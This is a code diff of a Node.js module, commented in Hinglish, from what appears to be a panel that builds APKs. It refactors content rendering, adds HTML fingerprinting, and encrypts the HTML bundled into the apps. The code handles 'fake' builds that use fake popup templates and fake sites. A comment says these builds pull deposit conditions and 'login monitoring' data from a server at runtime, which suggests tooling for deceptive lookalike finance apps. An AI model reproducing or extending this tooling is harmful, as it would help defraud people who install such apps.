@@ -24,6 +24,7 @@ const { encryptHtmlToBin, FIXED_PASSWORD } = require('./encrypt');
 const { extractDomain, buildUrls, injectParams, isDhaniUrl } = require('./htmlprocessor');
 const { ensureAudioGate, normalizeRegisterDelay, stripIntroSnippet, stripFirebaseLiveScript } = require('./apkbuilder');
 const { firebaseRequest } = require('./runtime-links');
+const { tagRenderedHtml, fileSha256 } = require('./buildstore');
 
 const TEMPLATES_DIR = path.join(__dirname, '..', 'templates');
 const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');
@@ -161,51 +162,77 @@ function buildParams(orderRow, designRow, isFake, fakeSite) {
 // kind: 'popup' | 'loading'
 // opts.base: request origin (https://panel.example) — fake builds me SHIM
 // ko server URL bake karne ke liye. Na mile to BASE_URL env fallback.
+//
+// renderContentHtml() = wahi pipeline jo APK build karta hai, sirf HTML return
+// karta hai (encryption ke bina). Admin verification isse "abhi ka content"
+// nikalta hai aur APK ke andar wale content se compare karta hai.
+function renderContentHtml(pathKey, kind = 'popup', kid = null, opts = {}) {
+  const sp = splitPathKid(pathKey);
+  pathKey = sp.key;
+  if (!kid) kid = sp.kid;
+  const found = findOrderByPath(pathKey);
+  if (!found) return null;
+  const { row, isFake, fakeSite } = found;
+  const design = {
+    popup_html_file: row.popup_html_file,
+    fake_popup_html_file: row.fake_popup_html_file,
+    java_type: row.java_type,
+    category: row.category
+  };
+  const params = buildParams(row, design, isFake, fakeSite);
+  if (!params) return null;
+
+  let html;
+  let templateFile;
+  let templateHash = null;
+  if (kind === 'loading') {
+    const loadingName = db.prepare('SELECT value FROM settings WHERE key=?').get('loading_html_file')?.value || 'loading.html';
+    const lp = path.join(TEMPLATES_DIR, loadingName);
+    if (!fs.existsSync(lp)) return null;
+    templateFile = loadingName;
+    templateHash = fileSha256(lp);
+    html = stripFirebaseLiveScript(stripIntroSnippet(injectParams(fs.readFileSync(lp, 'utf8'), params)));
+  } else {
+    const popupName = isFake ? design.fake_popup_html_file : design.popup_html_file;
+    const pp = path.join(TEMPLATES_DIR, popupName);
+    if (!fs.existsSync(pp)) return null;
+    templateFile = popupName;
+    templateHash = fileSha256(pp);
+    const raw = fs.readFileSync(pp, 'utf8');
+    // ── FAKE = SERVER LIVE MODE ──
+    // Fake APKs me Firebase SDK/config nahi jaata. Runtime links,
+    // minDeposit/conditions aur users (login monitoring / warning popup)
+    // server ke /api/rtdb bridge se aate hai (rtdb shim template me inject
+    // hota hai). BASE request origin se bake hota hai taaki remote-fetch
+    // wale APKs ko bhi live changes milte rahein.
+    if (isFake) {
+      const base = String((opts && opts.base) || process.env.BASE_URL || '').replace(/\/+$/, '');
+      if (/^https?:\/\//i.test(base)) {
+        params.liveMode = 'server';
+        params.liveBase = base;
+      }
+    }
+    html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
+  }
+
+  // Content fingerprint — APK wale build ke same marker ke saath compare ho
+  // sake (dekho utils/buildstore.js verifyOrderApkContent / server verify route).
+  const meta = { v: 1, o: row.id, t: templateFile, h: templateHash, fake: !!isFake };
+  html = tagRenderedHtml(html, meta);
+
+  return { html, meta, pathKey, isFake, fakeSite, row, params, kid: resolveContentKid(sp, kid) };
+}
+
+// kid suffix (path ke sath aaya ho to) — password resolution ke liye
+function resolveContentKid(sp, kid) {
+  return kid || sp.kid || null;
+}
+
 async function buildAppContent(pathKey, kind = 'popup', kid = null, opts = {}) {
   try {
-    const sp = splitPathKid(pathKey);
-    pathKey = sp.key;
-    if (!kid) kid = sp.kid;
-    const found = findOrderByPath(pathKey);
-    if (!found) return null;
-    const { row, isFake, fakeSite } = found;
-    const design = {
-      popup_html_file: row.popup_html_file,
-      fake_popup_html_file: row.fake_popup_html_file,
-      java_type: row.java_type,
-      category: row.category
-    };
-    const params = buildParams(row, design, isFake, fakeSite);
-    if (!params) return null;
-
-    let html;
-    if (kind === 'loading') {
-      const loadingName = db.prepare('SELECT value FROM settings WHERE key=?').get('loading_html_file')?.value || 'loading.html';
-      const lp = path.join(TEMPLATES_DIR, loadingName);
-      if (!fs.existsSync(lp)) return null;
-      html = stripFirebaseLiveScript(stripIntroSnippet(injectParams(fs.readFileSync(lp, 'utf8'), params)));
-    } else {
-      const popupName = isFake ? design.fake_popup_html_file : design.popup_html_file;
-      const pp = path.join(TEMPLATES_DIR, popupName);
-      if (!fs.existsSync(pp)) return null;
-      const raw = fs.readFileSync(pp, 'utf8');
-      // ── FAKE = SERVER LIVE MODE ──
-      // Fake APKs me Firebase SDK/config nahi jaata. Runtime links,
-      // minDeposit/conditions aur users (login monitoring / warning popup)
-      // server ke /api/rtdb bridge se aate hai (rtdb shim template me inject
-      // hota hai). BASE request origin se bake hota hai taaki remote-fetch
-      // wale APKs ko bhi live changes milte rahein.
-      if (isFake) {
-        const base = String((opts && opts.base) || process.env.BASE_URL || '').replace(/\/+$/, '');
-        if (/^https?:\/\//i.test(base)) {
-          params.liveMode = 'server';
-          params.liveBase = base;
-        }
-      }
-      html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
-    }
-
-    return await encryptToBuffer(html, resolveContentPassword(pathKey, kid));
+    const rendered = renderContentHtml(pathKey, kind, kid, opts);
+    if (!rendered) return null;
+    return await encryptToBuffer(rendered.html, resolveContentPassword(rendered.pathKey, rendered.kid));
   } catch (e) {
     return null;
   }
@@ -360,6 +387,7 @@ async function writeUsersNode(pathKey, rel, method, body) {
 
 module.exports = {
   buildAppContent,
+  renderContentHtml,
   buildAppTheme,
   resolveContentPassword,
   resolvePathContext,
